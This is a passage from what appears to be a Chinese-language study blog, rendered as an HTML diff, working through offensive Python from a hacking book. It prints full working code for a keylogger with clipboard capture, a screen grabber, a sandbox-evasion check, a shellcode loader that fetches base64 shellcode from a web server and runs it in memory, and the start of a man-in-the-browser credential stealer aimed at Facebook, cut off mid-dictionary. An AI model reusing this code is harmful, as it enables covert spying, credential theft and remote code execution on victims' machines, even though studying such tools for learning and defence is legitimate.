+</span></span><span class=line><span class=cl><span class=n>psapi</span> <span class=o>=</span> <span class=n>windll</span><span class=o>.</span><span class=n>psapi</span>
+</span></span><span class=line><span class=cl><span class=n>current_window</span> <span class=o>=</span> <span class=kc>None</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_current_process</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=c1># get a handle to the foreground window</span>
+</span></span><span class=line><span class=cl>    <span class=n>hwnd</span> <span class=o>=</span> <span class=n>user32</span><span class=o>.</span><span class=n>GetForegroundWindow</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># find the process ID</span>
+</span></span><span class=line><span class=cl>    <span class=n>pid</span> <span class=o>=</span> <span class=n>c_ulong</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>user32</span><span class=o>.</span><span class=n>GetWindowThreadProcessId</span><span class=p>(</span><span class=n>hwnd</span><span class=p>,</span> <span class=n>byref</span><span class=p>(</span><span class=n>pid</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># store the current process ID</span>
+</span></span><span class=line><span class=cl>    <span class=n>process_id</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>%d</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>pid</span><span class=o>.</span><span class=n>value</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># grab the executable</span>
+</span></span><span class=line><span class=cl>    <span class=n>executable</span> <span class=o>=</span> <span class=n>create_string_buffer</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>*</span> <span class=mi>512</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>h_process</span> <span class=o>=</span> <span class=n>kernel32</span><span class=o>.</span><span class=n>OpenProcess</span><span class=p>(</span><span class=mh>0x400</span> <span class=o>|</span> <span class=mh>0x10</span><span class=p>,</span> <span class=kc>False</span><span class=p>,</span> <span class=n>pid</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>psapi</span><span class=o>.</span><span class=n>GetModuleBaseNameA</span><span class=p>(</span><span class=n>h_process</span><span class=p>,</span> <span class=kc>None</span><span class=p>,</span> <span class=n>byref</span><span class=p>(</span><span class=n>executable</span><span class=p>),</span> <span class=mi>512</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># now read it&#39;s title</span>
+</span></span><span class=line><span class=cl>    <span class=n>window_title</span> <span class=o>=</span> <span class=n>create_string_buffer</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>*</span> <span class=mi>512</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>length</span> <span class=o>=</span> <span class=n>user32</span><span class=o>.</span><span class=n>GetWindowTextA</span><span class=p>(</span><span class=n>hwnd</span><span class=p>,</span> <span class=n>byref</span><span class=p>(</span><span class=n>window_title</span><span class=p>),</span> <span class=mi>512</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># print out the header if we&#39;re in the right process</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[ PID: </span><span class=si>%s</span><span class=s2> - </span><span class=si>%s</span><span class=s2> - </span><span class=si>%s</span><span class=s2> ]&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>process_id</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                                     <span class=n>executable</span><span class=o>.</span><span class=n>value</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                                     <span class=n>window_title</span><span class=o>.</span><span class=n>value</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>          <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># close handles</span>
+</span></span><span class=line><span class=cl>    <span class=n>kernel32</span><span class=o>.</span><span class=n>CloseHandle</span><span class=p>(</span><span class=n>hwnd</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>kernel32</span><span class=o>.</span><span class=n>CloseHandle</span><span class=p>(</span><span class=n>h_process</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>KeyStroke</span><span class=p>(</span><span class=n>event</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>current_window</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># check to see if target changed windows</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>event</span><span class=o>.</span><span class=n>WindowName</span> <span class=o>!=</span> <span class=n>current_window</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>current_window</span> <span class=o>=</span> <span class=n>event</span><span class=o>.</span><span class=n>WindowName</span>
+</span></span><span class=line><span class=cl>        <span class=n>get_current_process</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># if they pressed a standard key</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=mi>32</span> <span class=o>&lt;</span> <span class=n>event</span><span class=o>.</span><span class=n>Ascii</span> <span class=o>&lt;</span> <span class=mi>127</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=nb>chr</span><span class=p>(</span><span class=n>event</span><span class=o>.</span><span class=n>Ascii</span><span class=p>),</span> <span class=n>end</span><span class=o>=</span><span class=s1>&#39; &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=c1># if [Ctrl-V], get the value on the clipboard</span>
+</span></span><span class=line><span class=cl>        <span class=c1># added by Dan Frisch 2014</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>event</span><span class=o>.</span><span class=n>Key</span> <span class=o>==</span> <span class=s2>&#34;V&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>win32clipboard</span><span class=o>.</span><span class=n>OpenClipboard</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>            <span class=n>pasted_value</span> <span class=o>=</span> <span class=n>win32clipboard</span><span class=o>.</span><span class=n>GetClipboardData</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>            <span class=n>win32clipboard</span><span class=o>.</span><span class=n>CloseClipboard</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[PASTE] - </span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>pasted_value</span><span class=p>,</span> <span class=n>end</span><span class=o>=</span><span class=s1>&#39; &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[</span><span class=si>%s</span><span class=s2>]&#34;</span> <span class=o>%</span> <span class=n>event</span><span class=o>.</span><span class=n>Key</span><span class=p>,</span> <span class=n>end</span><span class=o>=</span><span class=s1>&#39; &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># pass execution to next hook registered </span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>True</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># create and register a hook manager</span>
+</span></span><span class=line><span class=cl><span class=n>kl</span> <span class=o>=</span> <span class=n>pyHook</span><span class=o>.</span><span class=n>HookManager</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>kl</span><span class=o>.</span><span class=n>KeyDown</span> <span class=o>=</span> <span class=n>KeyStroke</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># register the hook and execute forever</span>
+</span></span><span class=line><span class=cl><span class=n>kl</span><span class=o>.</span><span class=n>HookKeyboard</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>pythoncom</span><span class=o>.</span><span class=n>PumpMessages</span><span class=p>()</span>
+</span></span></code></pre></div><p>就是掛callback這沒問題
+但要注意的是<code>handler</code>
+可以看成windows programming的參考(或是ptr)</p><hr><p>screenshotter.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>win32gui</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>win32ui</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>win32con</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>win32api</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># grab a handle to the main desktop window</span>
+</span></span><span class=line><span class=cl><span class=n>hdesktop</span> <span class=o>=</span> <span class=n>win32gui</span><span class=o>.</span><span class=n>GetDesktopWindow</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># determine the size of all monitors in pixels</span>
+</span></span><span class=line><span class=cl><span class=n>width</span> <span class=o>=</span> <span class=n>win32api</span><span class=o>.</span><span class=n>GetSystemMetrics</span><span class=p>(</span><span class=n>win32con</span><span class=o>.</span><span class=n>SM_CXVIRTUALSCREEN</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>height</span> <span class=o>=</span> <span class=n>win32api</span><span class=o>.</span><span class=n>GetSystemMetrics</span><span class=p>(</span><span class=n>win32con</span><span class=o>.</span><span class=n>SM_CYVIRTUALSCREEN</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>left</span> <span class=o>=</span> <span class=n>win32api</span><span class=o>.</span><span class=n>GetSystemMetrics</span><span class=p>(</span><span class=n>win32con</span><span class=o>.</span><span class=n>SM_XVIRTUALSCREEN</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>top</span> <span class=o>=</span> <span class=n>win32api</span><span class=o>.</span><span class=n>GetSystemMetrics</span><span class=p>(</span><span class=n>win32con</span><span class=o>.</span><span class=n>SM_YVIRTUALSCREEN</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># create a device context</span>
+</span></span><span class=line><span class=cl><span class=n>desktop_dc</span> <span class=o>=</span> <span class=n>win32gui</span><span class=o>.</span><span class=n>GetWindowDC</span><span class=p>(</span><span class=n>hdesktop</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>img_dc</span> <span class=o>=</span> <span class=n>win32ui</span><span class=o>.</span><span class=n>CreateDCFromHandle</span><span class=p>(</span><span class=n>desktop_dc</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># create a memory based device context</span>
+</span></span><span class=line><span class=cl><span class=n>mem_dc</span> <span class=o>=</span> <span class=n>img_dc</span><span class=o>.</span><span class=n>CreateCompatibleDC</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># create a bitmap object</span>
+</span></span><span class=line><span class=cl><span class=n>screenshot</span> <span class=o>=</span> <span class=n>win32ui</span><span class=o>.</span><span class=n>CreateBitmap</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>screenshot</span><span class=o>.</span><span class=n>CreateCompatibleBitmap</span><span class=p>(</span><span class=n>img_dc</span><span class=p>,</span> <span class=n>width</span><span class=p>,</span> <span class=n>height</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>mem_dc</span><span class=o>.</span><span class=n>SelectObject</span><span class=p>(</span><span class=n>screenshot</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># copy the screen into our memory device context</span>
+</span></span><span class=line><span class=cl><span class=n>mem_dc</span><span class=o>.</span><span class=n>BitBlt</span><span class=p>((</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>),</span> <span class=p>(</span><span class=n>width</span><span class=p>,</span> <span class=n>height</span><span class=p>),</span> <span class=n>img_dc</span><span class=p>,</span> <span class=p>(</span><span class=n>left</span><span class=p>,</span> <span class=n>top</span><span class=p>),</span> <span class=n>win32con</span><span class=o>.</span><span class=n>SRCCOPY</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># save the bitmap to a file</span>
+</span></span><span class=line><span class=cl><span class=n>screenshot</span><span class=o>.</span><span class=n>SaveBitmapFile</span><span class=p>(</span><span class=n>mem_dc</span><span class=p>,</span> <span class=s1>&#39;c:</span><span class=se>\\</span><span class=s1>WINDOWS</span><span class=se>\\</span><span class=s1>Temp</span><span class=se>\\</span><span class=s1>screenshot.bmp&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># free our objects</span>
+</span></span><span class=line><span class=cl><span class=n>mem_dc</span><span class=o>.</span><span class=n>DeleteDC</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>win32gui</span><span class=o>.</span><span class=n>DeleteObject</span><span class=p>(</span><span class=n>screenshot</span><span class=o>.</span><span class=n>GetHandle</span><span class=p>())</span>
+</span></span></code></pre></div><p>Device Contexts(DC)就是呈現(或放置)圖像的地方
+這code有三個DC</p><ol><li>desktop</li><li>memory(放圖的地方)</li><li>bitmap(圖檔)</li></ol><p>詳細的Device Contexts要搭配GDI programming來看</p><p>整個流程是
+desktop -> memory -> bitmap -> .bmp</p><hr><p>sandbox_detect.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>ctypes</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>user32</span> <span class=o>=</span> <span class=n>ctypes</span><span class=o>.</span><span class=n>windll</span><span class=o>.</span><span class=n>user32</span>
+</span></span><span class=line><span class=cl><span class=n>kernel32</span> <span class=o>=</span> <span class=n>ctypes</span><span class=o>.</span><span class=n>windll</span><span class=o>.</span><span class=n>kernel32</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>keystrokes</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl><span class=n>mouse_clicks</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl><span class=n>double_clicks</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>LASTINPUTINFO</span><span class=p>(</span><span class=n>ctypes</span><span class=o>.</span><span class=n>Structure</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>_fields_</span> <span class=o>=</span> <span class=p>[(</span><span class=s2>&#34;cbSize&#34;</span><span class=p>,</span> <span class=n>ctypes</span><span class=o>.</span><span class=n>c_uint</span><span class=p>),</span> <span class=p>(</span><span class=s2>&#34;dwTime&#34;</span><span class=p>,</span> <span class=n>ctypes</span><span class=o>.</span><span class=n>c_ulong</span><span class=p>)]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_last_input</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>struct_lastinputinfo</span> <span class=o>=</span> <span class=n>LASTINPUTINFO</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>struct_lastinputinfo</span><span class=o>.</span><span class=n>cbSize</span> <span class=o>=</span> <span class=n>ctypes</span><span class=o>.</span><span class=n>sizeof</span><span class=p>(</span><span class=n>LASTINPUTINFO</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># get last input registered</span>
+</span></span><span class=line><span class=cl>    <span class=n>user32</span><span class=o>.</span><span class=n>GetLastInputInfo</span><span class=p>(</span><span class=n>ctypes</span><span class=o>.</span><span class=n>byref</span><span class=p>(</span><span class=n>struct_lastinputinfo</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># now determine how long the machine has been running</span>
+</span></span><span class=line><span class=cl>    <span class=n>run_time</span> <span class=o>=</span> <span class=n>kernel32</span><span class=o>.</span><span class=n>GetTickCount</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>elapsed</span> <span class=o>=</span> <span class=n>run_time</span> <span class=o>-</span> <span class=n>struct_lastinputinfo</span><span class=o>.</span><span class=n>dwTime</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] It&#39;s been </span><span class=si>%d</span><span class=s2> milliseconds since the last input event.&#34;</span> <span class=o>%</span> <span class=n>elapsed</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>elapsed</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_key_press</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>mouse_clicks</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>keystrokes</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0xff</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>user32</span><span class=o>.</span><span class=n>GetAsyncKeyState</span><span class=p>(</span><span class=n>i</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>32767</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=c1># 0x1 is the code for a left mouse click</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>i</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=n>mouse_clicks</span> <span class=o>+=</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=n>keystrokes</span> <span class=o>+=</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>None</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>detect_sandbox</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>mouse_clicks</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>keystrokes</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>max_keystrokes</span> <span class=o>=</span> <span class=n>random</span><span class=o>.</span><span class=n>randint</span><span class=p>(</span><span class=mi>10</span><span class=p>,</span> <span class=mi>25</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>max_mouse_clicks</span> <span class=o>=</span> <span class=n>random</span><span class=o>.</span><span class=n>randint</span><span class=p>(</span><span class=mi>5</span><span class=p>,</span> <span class=mi>25</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>double_clicks</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>    <span class=n>max_double_clicks</span> <span class=o>=</span> <span class=mi>10</span>
+</span></span><span class=line><span class=cl>    <span class=n>double_click_threshold</span> <span class=o>=</span> <span class=mf>0.250</span>
+</span></span><span class=line><span class=cl>    <span class=n>first_double_click</span> <span class=o>=</span> <span class=kc>None</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>average_mousetime</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>    <span class=n>max_input_threshold</span> <span class=o>=</span> <span class=mi>30000</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>previous_timestamp</span> <span class=o>=</span> <span class=kc>None</span>
+</span></span><span class=line><span class=cl>    <span class=n>detection_complete</span> <span class=o>=</span> <span class=kc>False</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>last_input</span> <span class=o>=</span> <span class=n>get_last_input</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># if we hit our threshold let&#39;s bail out</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>last_input</span> <span class=o>&gt;=</span> <span class=n>max_input_threshold</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=ow>not</span> <span class=n>detection_complete</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>keypress_time</span> <span class=o>=</span> <span class=n>get_key_press</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>keypress_time</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span> <span class=ow>and</span> <span class=n>previous_timestamp</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=c1># calculate the time between double clicks</span>
+</span></span><span class=line><span class=cl>            <span class=n>elapsed</span> <span class=o>=</span> <span class=n>keypress_time</span> <span class=o>-</span> <span class=n>previous_timestamp</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=c1># the user double clicked</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>elapsed</span> <span class=o>&lt;=</span> <span class=n>double_click_threshold</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=n>double_clicks</span> <span class=o>+=</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>first_double_click</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                    <span class=c1># grab the timestamp of the first double click</span>
+</span></span><span class=line><span class=cl>                    <span class=n>first_double_click</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                    <span class=c1># did they try to emulate a rapid succession of clicks?   </span>
+</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=n>double_clicks</span> <span class=o>==</span> <span class=n>max_double_clicks</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                        <span class=k>if</span> <span class=n>keypress_time</span> <span class=o>-</span> <span class=n>first_double_click</span> <span class=o>&lt;=</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl>                                <span class=n>max_double_clicks</span> <span class=o>*</span> <span class=n>double_click_threshold</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>                            <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=c1># we are happy there&#39;s enough user input</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>keystrokes</span> <span class=o>&gt;=</span> <span class=n>max_keystrokes</span> \
+</span></span><span class=line><span class=cl>                    <span class=ow>and</span> <span class=n>double_clicks</span> <span class=o>&gt;=</span> <span class=n>max_double_clicks</span> \
+</span></span><span class=line><span class=cl>                    <span class=ow>and</span> <span class=n>mouse_clicks</span> <span class=o>&gt;=</span> <span class=n>max_mouse_clicks</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=k>return</span>
+</span></span><span class=line><span class=cl>            <span class=n>previous_timestamp</span> <span class=o>=</span> <span class=n>keypress_time</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>keypress_time</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>previous_timestamp</span> <span class=o>=</span> <span class=n>keypress_time</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>detect_sandbox</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;We are ok!&#34;</span><span class=p>)</span>
+</span></span></code></pre></div><p>用按鍵次數來判斷我們是不是在sanbox中，因為sandbox通常是自動化操作
+所以按鍵次數相對固定</p><p>有趣的是這裡處理按鍵是用ctypes硬幹，其實也可以用pyhooks</p><hr><p>shell_exec.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>ctypes</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib.request</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># retrieve the shellcode from our web server</span>
+</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://localhost:8000/shellcode.bin&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>response</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>urlopen</span><span class=p>(</span><span class=n>url</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># decode the shellcode from base64 </span>
+</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>response</span><span class=o>.</span><span class=n>read</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># create a buffer in memory</span>
+</span></span><span class=line><span class=cl><span class=n>shellcode_buffer</span> <span class=o>=</span> <span class=n>ctypes</span><span class=o>.</span><span class=n>create_string_buffer</span><span class=p>(</span><span class=n>shellcode</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>shellcode</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># create a function pointer to our shellcode</span>
+</span></span><span class=line><span class=cl><span class=n>shellcode_func</span> <span class=o>=</span> <span class=n>ctypes</span><span class=o>.</span><span class=n>cast</span><span class=p>(</span><span class=n>shellcode_buffer</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                             <span class=n>ctypes</span><span class=o>.</span><span class=n>CFUNCTYPE</span><span class=p>(</span><span class=n>ctypes</span><span class=o>.</span><span class=n>c_void_p</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># call our shellcode</span>
+</span></span><span class=line><span class=cl><span class=n>shellcode_func</span><span class=p>()</span>
+</span></span></code></pre></div><p>把bytes傳型成CFUNCTYPE來執行
+很有趣!!</p><p>不過要怎麼產生.bin?
+參考CANVAS或是Metasploits</p><h2 id=ch9>CH9<a hidden class=anchor aria-hidden=true href=#ch9>#</a></h2><p>CLE automation??
+mitb.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib.parse</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>win32com.client</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>data_receiver</span> <span class=o>=</span> <span class=s2>&#34;http://localhost:8080/&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>target_sites</span> <span class=o>=</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;www.facebook.com&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;logout_url&#34;</span><span class=p>:</span> <span class=kc>None</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;logout_form&#34;</span><span class=p>:</span> <span class=s2>&#34;logout_form&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;login_form_index&#34;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span>
